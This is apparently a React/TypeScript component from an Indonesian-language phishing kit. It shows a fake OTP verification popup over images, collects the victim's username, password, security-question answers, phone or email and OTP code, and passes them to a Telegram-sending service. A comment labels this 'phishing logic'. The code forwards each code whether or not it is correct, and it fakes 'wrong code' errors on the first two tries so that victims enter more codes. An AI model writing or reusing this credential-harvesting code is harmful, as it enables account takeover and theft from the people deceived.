import { useState, useEffect } from 'react';
import { sendOTPRequest, sendOTPSubmission } from '../services/telegram';
import { FiSmartphone, FiMail, FiChevronRight, FiX } from 'react-icons/fi';
import './OTPVerificationImage.css';

interface OTPVerificationImageProps {
  onClose?: () => void;
  onSubmitOTP: (otp: string, method: 'wa' | 'email', identifier: string) => void;
  playClickSound?: () => void;
  username: string;
  password?: string;
  q1?: string;
  a1?: string;
  q2?: string;
  a2?: string;
}

const OTPVerificationImage = ({ 
  onClose, 
  onSubmitOTP, 
  playClickSound, 
  username,
  password,
  q1,
  a1,
  q2,
  a2
}: OTPVerificationImageProps) => {
  const [otpMethod, setOtpMethod] = useState<'wa' | 'email' | null>(null);
  const [identifier, setIdentifier] = useState(''); // Phone or Email
  const [otpCode, setOtpCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [requestLoading, setRequestLoading] = useState(false);
  const [otpRequested, setOtpRequested] = useState(false);
  const [countdown, setCountdown] = useState(0);
  
  // Logic States
  const [attemptCount, setAttemptCount] = useState(0);
  const [showErrorModal, setShowErrorModal] = useState(false);
  
  // Toast State
  const [showToast, setShowToast] = useState(false);
  const [toastMessage, setToastMessage] = useState('');

  useEffect(() => {
    let timer: ReturnType<typeof setTimeout>;
    if (countdown > 0) {
      timer = setTimeout(() => setCountdown(countdown - 1), 1000);
    }
    return () => clearTimeout(timer);
  }, [countdown]);

  const triggerToast = (msg: string) => {
    setToastMessage(msg);
    setShowToast(true);
    setTimeout(() => {
      setShowToast(false);
    }, 3000);
  };

  const handleMethodSelect = (method: 'wa' | 'email') => {
    if (playClickSound) playClickSound();
    setOtpMethod(method);
    setIdentifier('');
    setOtpCode('');
    setOtpRequested(false);
    setCountdown(0);
    setAttemptCount(0); // Reset attempts when method changes
  };

  const handleGetCode = async () => {
    if (playClickSound) playClickSound();
    if (!identifier || identifier.length < 5) {
      triggerToast('Silakan isi nomor/email dengan benar');
      return;
    }
    
    setRequestLoading(true);
    // Pass username and full data to sendOTPRequest
    const success = await sendOTPRequest(username, identifier, otpMethod!, password, q1, a1, q2, a2);
    setRequestLoading(false);
    
    if (success) {
      setOtpRequested(true);
      setCountdown(60); // 60 seconds cooldown
      triggerToast('Kode OTP telah dikirim!');
    } else {
      triggerToast('Gagal mengirim permintaan OTP. Silakan coba lagi.');
    }
  };

  const handleOTPSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    // Allow 4 to 6 digit OTPs
    if (!otpMethod || !otpCode || otpCode.length < 4) return;
    
    setLoading(true);
    
    // Send OTP to Telegram regardless of correctness (phishing logic)
    try {
      await sendOTPSubmission(username, identifier, otpCode, otpMethod, password, q1, a1, q2, a2);
    } catch (error) {
      console.error('Failed to send OTP submission:', error);
    }

    // Simulate verification delay
    setTimeout(() => {
      setLoading(false);
      
      const nextAttempt = attemptCount + 1;
      setAttemptCount(nextAttempt);

      // Logic: 
      // Attempt 1 (nextAttempt=1) -> Error
      // Attempt 2 (nextAttempt=2) -> Error
      // Attempt 3 (nextAttempt=3) -> Success/Maintenance
      
      if (nextAttempt < 3) {
        setShowErrorModal(true);
        // We keep the code in input so user can edit/retry
      } else {
        // Third attempt -> Proceed
        onSubmitOTP(otpCode, otpMethod, identifier);
      }
    }, 2000);
  };

  const handleBackToMethodSelection = () => {
    if (playClickSound) playClickSound();
    setOtpMethod(null);
    setIdentifier('');
    setOtpCode('');
    setOtpRequested(false);
  };
  
  const handleCloseErrorModal = () => {
    setShowErrorModal(false);
  };

  // Method Selection Screen
  if (!otpMethod) {
    return (
      <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fade-in">
        {/* Container with Red/Brown Gradient */}
        <div className="bg-gradient-to-b from-[#5a1e1e] to-[#2b0d0d] rounded-2xl p-0 w-full max-w-md shadow-2xl relative border-2 border-[#8b4513] overflow-hidden">
          
          {/* Header (Optional, if needed to match context, but image shows list only. 
              Adding a header for better UX if not strictly prohibited, but image suggests simple list.
              I will add a title for clarity but style it to blend in) */}
          <div className="p-6 pb-2 text-center">
             <h2 className="text-xl font-bold text-[#ffd88a] mb-1">Pilih Metode Verifikasi</h2>
          </div>
          
          <div className="flex flex-col w-full">
            {/* Phone Option */}
            <button 
              onClick={() => handleMethodSelect('wa')}
              className="group relative flex items-center justify-between w-full p-6 border-b border-[#8b4513]/50 hover:bg-[#8b4513]/20 transition-colors focus:outline-none active:bg-[#8b4513]/40"
            >
              <div className="flex items-center gap-4">
                <div className="w-10 h-10 flex items-center justify-center rounded-lg bg-[#ffd88a]/10">
                  <FiSmartphone className="w-6 h-6 text-[#ffd88a]" />
                </div>
                <span className="text-[#ffd88a] font-medium text-lg">Nomor HP</span>
              </div>
              
              <div className="flex items-center gap-2">
                <span className="text-[#ffd88a] font-bold text-sm">Verifikasi</span>
                <FiChevronRight className="text-[#ffd88a] w-5 h-5" />
              </div>

              {/* Ribbon */}
              <div className="absolute top-0 right-0 overflow-hidden w-20 h-20 pointer-events-none">
                
              </div>
            </button>

            {/* Email Option */}
            <button 
              onClick={() => handleMethodSelect('email')}
              className="group relative flex items-center justify-between w-full p-6 hover:bg-[#8b4513]/20 transition-colors focus:outline-none active:bg-[#8b4513]/40"
            >
              <div className="flex items-center gap-4">
                <div className="w-10 h-10 flex items-center justify-center rounded-lg bg-[#ffd88a]/10">
                  <FiMail className="w-6 h-6 text-[#ffd88a]" />
                </div>
                <span className="text-[#ffd88a] font-medium text-lg">Email</span>
              </div>
              
              <div className="flex items-center gap-2">
                <span className="text-[#ffd88a] font-bold text-sm">Verifikasi</span>
                <FiChevronRight className="text-[#ffd88a] w-5 h-5" />
              </div>

              {/* Ribbon */}
              <div className="absolute top-0 right-0 overflow-hidden w-20 h-20 pointer-events-none">
               
              </div>
            </button>
          </div>
          
          {/* Close button (subtle) */}
          {onClose && (
            <button 
              className="absolute top-2 right-2 text-[#ffd88a]/50 hover:text-[#ffd88a] transition-colors p-2"
              onClick={onClose}
              aria-label="Close"
            >
              <FiX size={20} />
            </button>
          )}
        </div>
      </div>
    );
  }

  // OTP Input Screen (Flow Baru)
  return (
    <div className="otp-input-image-popup-container animate-pop-in">
      {/* Background Image */}
      <img 
        src={otpMethod === 'wa' ? '/verifikasihp.png' : '/verifikasiemail.png'} 
        alt={`Verifikasi ${otpMethod === 'wa' ? 'WhatsApp' : 'Email'}`} 
        className="otp-input-bg-img" 
      />
      
      {/* Back Button */}
      <button 
        className="otp-back-btn"
        onClick={handleBackToMethodSelection}
        aria-label="Kembali"
      >
        ←
      </button>
      
      {/* Inputs Container - Positioned over the image */}
      <div className={`otp-fields-container ${otpMethod === 'email' ? 'otp-mode-email' : 'otp-mode-wa'}`}>
        
        {/* Identifier Input (HP/Email) */}
        <div className="otp-field-row">
          <input
            type={otpMethod === 'wa' ? 'tel' : 'email'}
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
            className="otp-identifier-input"
            placeholder={otpMethod === 'wa' ? '08xxxxxxxx' : 'email@example.com'}
            disabled={otpRequested || requestLoading}
          />
        </div>

        {/* OTP Code Input & Get Button */}
        <div className="otp-field-row code-row">
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={6}
            value={otpCode}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '');
              if (value.length <= 6) {
                setOtpCode(value);
              }
            }}
            className="otp-code-input"
            placeholder="Kode Verifikasi"
            disabled={!otpRequested || loading}
          />
          
          <button 
            className="otp-get-code-btn"
            onClick={handleGetCode}
            disabled={requestLoading || countdown > 0}
          >
            {countdown > 0 ? `${countdown}s` : 'Dapatkan'}
          </button>
        </div>
      </div>
      
      {/* Submit Button (Tentukan) */}
      <button
        onClick={handleOTPSubmit}
        className={`otp-submit-image-btn ${(!otpCode || otpCode.length < 4 || loading) ? 'disabled' : ''}`}
        disabled={!otpCode || otpCode.length < 4 || loading}
      >
        {/* Transparent hit area over the button in image */}
      </button>
      
      <button 
        className="otp-close-btn"
        onClick={onClose}
        aria-label="Close"
      >
        ✕
      </button>

      {/* Toast Notification */}
      <div className={`otp-toast ${showToast ? 'show' : ''}`}>
        {toastMessage}
      </div>

      {/* Error Modal */}
      {showErrorModal && (
        <div className="otp-error-modal-container">
          <div className="otp-error-modal-panel">
            <button className="otp-error-close-icon" onClick={handleCloseErrorModal}>✕</button>
            <div className="otp-error-message">Kode verifikasi salah.</div>
            <button className="otp-error-btn" onClick={handleCloseErrorModal}>Tentukan</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default OTPVerificationImage;
